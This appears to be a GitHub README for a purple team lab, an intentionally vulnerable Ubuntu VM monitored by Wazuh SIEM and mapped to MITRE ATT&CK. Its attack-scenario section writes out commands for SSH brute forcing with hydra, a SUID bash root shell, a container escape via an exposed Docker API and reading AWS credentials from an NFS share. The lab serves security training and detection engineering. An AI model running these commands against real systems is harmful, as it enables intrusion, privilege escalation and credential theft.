# Purple Team Lab: Modern Vulnerability Testing Environment

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Ubuntu](https://img.shields.io/badge/Ubuntu-24.04%20LTS-orange)](https://ubuntu.com/)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-red)](https://attack.mitre.org/)

A comprehensive purple team laboratory environment built on Ubuntu 24.04 LTS, designed for security research, vulnerability testing, and detection engineering. This lab implements real-world cloud security misconfigurations and traditional vulnerabilities, all monitored by Wazuh SIEM.

**Author:** Greg Lewis  
**Blog:** [gregqlewis.com](https://gregqlewis.com)  
**Purpose:** Security research, CISSP exam preparation, and portfolio demonstration

---

## 🎯 Overview

This project demonstrates a production-quality vulnerable environment that:
- Simulates **real-world security misconfigurations** found in enterprise environments
- Maps vulnerabilities to **MITRE ATT&CK** framework techniques
- Integrates with **Wazuh SIEM** for detection engineering
- Focuses on **cloud security** scenarios (Docker, AWS credentials)
- Provides hands-on experience for **offensive and defensive** security operations

**⚠️ WARNING:** This system is intentionally vulnerable. **NEVER** deploy on production networks or internet-facing systems.

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────┐
│              Unraid Server                      │
│                                                 │
│  ┌──────────────────────────────────────────┐   │
│  │ Ubuntu 24.04 VulnLab                     │   │
│  │ • SSH (weak authentication)              │   │
│  │ • DVWA (vulnerable web app)              │   │
│  │ • Docker API (exposed)                   │   │
│  │ • AWS credentials (leaked)               │   │
│  │ • NFS/FTP/SMB (open shares)              │   │
│  │ • SUID binaries                          │   │
│  │ • Vulnerable cron jobs                   │   │
│  │                                          │   │
│  │ [Wazuh Agent] ──────────────────────────┐│   │
│  └──────────────────────────────────────────┘   │
│                                            │    │
│  ┌─────────────────────────────────────────┼───┐│
│  │ Wazuh Manager + Graylog + OpenSearch    │   ││
│  │ • Custom detection rules                │   ││
│  │ • MITRE ATT&CK mapping                  │   ││
│  │ • Real-time alerting                    │   ││
│  └─────────────────────────────────────────────┘│
└─────────────────────────────────────────────────┘
                       ▲
                       │ Attack simulations
                       │
                ┌──────┴──────┐
                │  Kali Linux │
                │  (Attacker) │
                └─────────────┘
```

---

## 🔥 Vulnerabilities Implemented

| Category | Vulnerability | MITRE Technique | Risk Level |
|----------|---------------|-----------------|------------|
| **Authentication** | Root SSH login enabled | T1078 | Critical |
| **Authentication** | Weak user passwords | T1110 | High |
| **Web Application** | DVWA installation | T1190 | Critical |
| **Container Security** | Exposed Docker API (port 2375) | T1611 | Critical |
| **Credential Exposure** | AWS credentials in files | T1552.001 | Critical |
| **Privilege Escalation** | SUID bash binary | T1548 | Critical |
| **Privilege Escalation** | World-writable cron script | T1053.003 | High |
| **Network Services** | Anonymous FTP access | T1021.002 | High |
| **Network Services** | Open NFS shares | T1039 | High |
| **Network Services** | SMB guest access | T1021.002 | Medium |
| **Web Config** | Exposed PHP config files | T1552 | High |

**Total Coverage:** 15+ MITRE ATT&CK techniques across 7 tactics

---

## 🚀 Quick Start

### Prerequisites

- Hypervisor (Unraid, VMware, VirtualBox, Proxmox)
- Ubuntu 24.04 LTS Server ISO
- Minimum 4GB RAM, 2 CPU cores, 50GB disk
- Kali Linux for attack simulations (optional)
- Wazuh Manager for monitoring (optional)

### Installation

**Option 1: Automated Setup (Recommended)**
```bash
# Clone the repository
git clone https://github.com/yourusername/purple-team-lab.git
cd purple-team-lab

# Run the complete installation
cd scripts/setup
chmod +x install-all.sh
sudo ./install-all.sh
```

**Option 2: Manual Step-by-Step**

See [docs/installation.md](docs/installation.md) for detailed manual installation instructions.

### Post-Installation

1. **Verify Services:**
   ```bash
   ./scripts/verify-lab.sh
   ```

2. **Configure Wazuh Agent:**
   - Edit `/var/ossec/etc/ossec.conf`
   - Set your Wazuh Manager IP
   - Restart agent: `systemctl restart wazuh-agent`

3. **Access DVWA:**
   - Navigate to: `http://<vm-ip>/DVWA/`
   - Login: `admin` / `password`
   - Click "Create / Reset Database"

---

## 🎯 Attack Scenarios

### Scenario 1: Initial Access → Privilege Escalation
```bash
# SSH brute force
hydra -l admin -p admin ssh://<vm-ip>

# Exploit SUID binary
ssh admin@<vm-ip>
/usr/local/bin/rootbash -p
```

### Scenario 2: Container Escape via Docker API
```bash
# Access exposed Docker API
docker -H tcp://<vm-ip>:2375 ps

# Deploy privileged container
docker -H tcp://<vm-ip>:2375 run -it --privileged -v /:/host ubuntu chroot /host
```

### Scenario 3: Cloud Credential Theft
```bash
# Mount NFS share
sudo mount -t nfs <vm-ip>:/home /mnt/target

# Extract AWS credentials
cat /mnt/target/developer/.aws/credentials
```

**Full attack scenarios:** [docs/attack-scenarios.md](docs/attack-scenarios.md)

---

## 🛡️ Detection Engineering

Custom Wazuh rules are provided to detect all implemented attack techniques:

- SSH root login attempts
- Docker API unauthorized access
- AWS credential file access
- SUID binary execution
- NFS mount operations
- FTP anonymous connections
- Suspicious cron script modifications

**Rule details:** [docs/detection-rules.md](docs/detection-rules.md)

---

## 📊 MITRE ATT&CK Coverage

### Tactics Covered
- **Initial Access** (3 techniques)
- **Execution** (1 technique)
- **Persistence** (1 technique)
- **Privilege Escalation** (3 techniques)
- **Credential Access** (2 techniques)
- **Discovery** (3 techniques)
- **Lateral Movement** (2 techniques)
- **Collection** (1 technique)

**Full mapping:** [docs/mitre-mapping.md](docs/mitre-mapping.md)

---

## 📚 Documentation

- **[Architecture](docs/architecture.md)** - Detailed system design
- **[Installation Guide](docs/installation.md)** - Step-by-step setup
- **[Attack Scenarios](docs/attack-scenarios.md)** - Practical exploitation examples
- **[Detection Rules](docs/detection-rules.md)** - Wazuh SIEM configuration
- **[MITRE Mapping](docs/mitre-mapping.md)** - ATT&CK framework alignment

---

## 🔒 Security Considerations

**This lab is intentionally vulnerable. Follow these guidelines:**

1. ⚠️ **NEVER** expose to the internet
2. ⚠️ Deploy only on isolated networks
3. ⚠️ Use separate VLAN or air-gapped environment
4. ⚠️ Regularly snapshot/backup for quick recovery
5. ⚠️ Monitor for unauthorized access
6. ⚠️ Destroy when not actively used

**This environment is for educational purposes only.**

---

## 🎓 Learning Objectives

This lab helps develop skills in:

- **Offensive Security:** Vulnerability exploitation, penetration testing
- **Defensive Security:** SIEM configuration, detection engineering
- **Cloud Security:** Container escape, credential theft, API security
- **Incident Response:** Attack detection, log analysis
- **Compliance:** MITRE ATT&CK framework, security controls

**Perfect for:**
- CISSP exam preparation (Domains 3, 5, 6, 7)
- Security analyst skill development
- Cloud security engineer training
- Purple team operations practice

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add new vulnerabilities or detection rules
4. Submit a pull request

**Ideas for contributions:**
- Additional cloud misconfigurations
- Kubernetes attack scenarios
- Advanced persistence techniques
- Enhanced detection rules
- Integration with other SIEM platforms

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🙏 Acknowledgments

- **DVWA Team** - Damn Vulnerable Web Application
- **Wazuh** - Open-source SIEM platform
- **MITRE ATT&CK** - Threat modeling framework
- **Rapid7** - Metasploitable project inspiration

---

## 📧 Contact

**Greg Lewis**  
- Blog: [gregqlewis.com](https://gregqlewis.com)
- LinkedIn: [linkedin.com/in/gregqlewis](https://linkedin.com/in/gregqlewis)
- GitHub: [@gregqlewis](https://github.com/gregqlewis)

**Disclaimer:** This project is for educational purposes only. The author is not responsible for misuse of this information.

---

## 🔖 Tags

`cybersecurity` `purple-team` `vulnerability-testing` `mitre-attack` `wazuh` `docker-security` `cloud-security` `penetration-testing` `siem` `detection-engineering` `ubuntu` `cissp` `offensive-security` `defensive-security` `home-lab`